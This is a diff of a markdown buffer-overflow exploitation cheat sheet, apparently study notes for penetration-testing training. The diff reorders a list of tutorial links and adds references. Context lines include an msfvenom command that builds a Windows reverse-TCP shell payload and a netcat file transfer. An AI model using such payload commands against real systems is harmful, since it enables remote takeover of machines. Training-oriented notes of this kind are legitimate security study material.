@@ -1,18 +1,4 @@
 # Buffer Overflow Cheat Sheet
-## Tutorials / Methodologies
-* https://github.com/gh0x0st/Buffer_Overflow
-* https://infosecsanyam261.gitbook.io/tryharder/buffer-overflow
-* https://blog.own.sh/introduction-to-network-protocol-fuzzing-buffer-overflow-exploitation/
-* https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
-* https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
-* https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
-* https://eazeysec.com/BOF-Method/
-* http://www.primalsecurity.net/tutorials/exploit-tutorials/
-* http://www.fuzzysecurity.com/tutorials.html
-* Jump to shellcode:
-  * https://www.abatchy.com/2017/05/jumping-to-shellcode.html
-  * https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/
-
 ## Common Tips
 1. Running Vulnerable-apps, then use netcat to makesure the shell connection, and test the function for buffer storing
 ```
@@ -64,6 +50,20 @@ msf-nasm_shell
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00\xyz\xxx" EXITFUNC=thread -f python -v payload"
 ```
+
+## Tutorials / Methodologies
+* https://github.com/gh0x0st/Buffer_Overflow
+* https://infosecsanyam261.gitbook.io/tryharder/buffer-overflow
+* https://blog.own.sh/introduction-to-network-protocol-fuzzing-buffer-overflow-exploitation/
+* https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
+* https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
+* https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+* https://eazeysec.com/BOF-Method/
+* http://www.primalsecurity.net/tutorials/exploit-tutorials/
+* http://www.fuzzysecurity.com/tutorials.html
+* Jump to shellcode:
+  * https://www.abatchy.com/2017/05/jumping-to-shellcode.html
+  * https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/
 
 ## Tools
 * [Immunity Debugger](https://www.immunityinc.com/products/debugger/): A powerful new way to write exploits, analyze malware, and reverse engineer binary files ([whitepaper](https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982), [course](https://yaksas-csc.teachable.com/p/immunity-debugger-for-exploit-devs-ycsc-lab-essentials))
@@ -152,4 +152,7 @@ C:\Tools\windows_buffer_overflows> nc -w 3 192.168.119.223 1234 < VulnApp1.exe
 * Download windows 10 x86 ISO: https://www.microsoft.com/en-gb/software-download/windows10ISO
 
 # 
-_Reffrence http://strongcourage.github.io/2020/04/19/bof.html_
+Reffrence _https://tcm-sec.com/2019/05/25/buffer-overflows-made-easy/
+          https://www.thecybermentor.com/buffer-overflows-made-easy
+          http://strongcourage.github.io/2020/04/19/bof.html
+
